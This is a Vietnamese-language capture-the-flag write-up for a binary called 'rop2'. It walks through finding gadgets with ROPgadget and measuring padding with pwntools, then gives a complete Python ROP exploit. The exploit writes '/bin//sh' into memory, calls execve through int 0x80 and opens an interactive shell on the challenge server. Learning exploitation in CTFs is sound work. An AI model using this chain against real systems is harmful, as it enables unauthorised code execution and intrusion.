Đầu tiên ta sẽ dung ROPGadget để tìm các gadget có trong file thực thi bằng cách chạy câu lệnh: 
```bash
ROPgadget --binary ./rop2 --rop --badbytes "0a"
```
![image](https://user-images.githubusercontent.com/64201705/140645741-f58a37de-dd3c-4950-b35c-8d6f03533974.png)

Nó sẽ tạo payload cho chúng ta luôn:

![image](https://user-images.githubusercontent.com/64201705/140645756-256d57d9-16a7-415b-9fa5-4de0def38229.png)

Nhiệm vụ của ta bây giờ là tìm padding sao cho việc ghi đè lên bộ nhớ thực hiện đúng:
- Ta sẽ thử với padding 50:
python2 -c "from pwn import *; print cyclic(50)" | ./rop2
- Chương trình sẽ bị crash và segmentation fault. Ta sẽ chạy lệnh dmesg | tail để lấy địa chỉ tại
vị trí rop2 bị crash và tìm padding bằng hàm cyclic_find(địa_chỉ_crash):

![image](https://user-images.githubusercontent.com/64201705/140645770-36640d58-f94a-4b0b-8d94-c0e7f42fb5a6.png)

Như vậy padding là 28 * a

Code thực thi:
```python
from pwn import *
from struct import pack

p = 'A' * (0x18 + 0x04) # 28

p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '/bin'
p += pack('<I', 0x080da060) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4
p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
p += '//sh'
p += pack('<I', 0x080da064) # padding without overwrite edx
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data
p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x080da060) # padding without overwrite ebx
p += pack('<I', 0x0806ee6b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8
p += pack('<I', 0x08056420) # xor eax, eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x0807c2fa) # inc eax ; ret
p += pack('<I', 0x08049563) # int 0x80

process = remote('45.122.249.68', 10006)
process.sendline(p)
process.interactive()
```

Flag:
![image](https://user-images.githubusercontent.com/64201705/140645819-817e5085-3eed-4f5d-ad86-db4c1cb57a82.png)
